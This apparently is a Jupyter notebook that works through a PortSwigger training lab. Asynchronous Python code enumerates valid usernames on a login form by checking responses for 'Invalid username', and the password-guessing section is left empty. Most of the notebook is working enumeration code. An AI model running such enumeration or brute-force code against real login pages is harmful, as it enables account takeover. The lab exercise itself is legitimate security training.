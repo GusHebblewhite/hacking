{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7fb1b012",
   "metadata": {},
   "source": [
    "This notebook demonstrates how to perform GET/POST requests in an asynchronous manner. \n",
    "\n",
    "This might be useful for web scraping and brute forcing."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b820a1b5",
   "metadata": {},
   "source": [
    "We'll essentially try to do username enumeration plus password brute forcing. The lab descrption is here: \n",
    "\n",
    "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3f160af4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "import asyncio\n",
    "import async_timeout\n",
    "import os\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9b65c778",
   "metadata": {},
   "outputs": [],
   "source": [
    "uname_dir = \"../../../library/text_files/uname_list.txt\"\n",
    "pw_dir = \"../../../library/text_files/pw_list.txt\"\n",
    "\n",
    "with open(uname_dir, 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]\n",
    "with open(pw_dir, 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a364941",
   "metadata": {},
   "source": [
    "## Enumerate Usernames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "226eb071",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://acf61fb41e3636b9c0d5554a00700041.web-security-academy.net/login\"\n",
    "\n",
    "\n",
    "#Loop through usernames performing ansynchronous requests\n",
    "\n",
    "async def test_uname(session, url, each_username):\n",
    "    #10 second time out\n",
    "    with async_timeout.timeout(10):\n",
    "        async with session.post(url, data={\"username\" : each_username, \"password\" : \"test123\"}) as response:\n",
    "            return [each_username, 'Invalid username' in await response.text()]\n",
    "        \n",
    "        \n",
    "async def main(loop, url, usernames):\n",
    "    async with aiohttp.ClientSession(loop=loop) as session:\n",
    "        tasks = [test_uname(session, url, each_username) for each_username in usernames]\n",
    "        await asyncio.gather(*tasks)\n",
    "    \n",
    "\n",
    "loop = asyncio.get_event_loop()\n",
    "loop.run_until_complete(main(loop, URL, usernames))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "c27f57c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://acf61fb41e3636b9c0d5554a00700041.web-security-academy.net/login\"\n",
    "\n",
    "\n",
    "#Loop through usernames performing ansynchronous requests\n",
    "\n",
    "async def test_uname(session, url, each_username):\n",
    "    #10 second time out\n",
    "    with async_timeout.timeout(10):\n",
    "        async with session.post(url, data={\"username\" : each_username, \"password\" : \"test123\"}) as response:\n",
    "            return [each_username, 'Invalid username' in await response.text()]\n",
    "        \n",
    "        \n",
    "async def main(loop, url, usernames):\n",
    "    async with aiohttp.ClientSession(loop=loop) as session:\n",
    "        tasks = [test_uname(session, url, each_username) for each_username in usernames]\n",
    "        return await asyncio.gather(*tasks)\n",
    "    \n",
    "\n",
    "loop = asyncio.get_event_loop()\n",
    "results = loop.run_until_complete(main(loop, URL, usernames))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fa7605b",
   "metadata": {},
   "source": [
    "Now we can easily find the username of the valid user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "5a317895",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['afiliados']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[x[0] for x in results if x[1] == False]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e07bc4a",
   "metadata": {},
   "source": [
    "## Password guessing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec707797",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
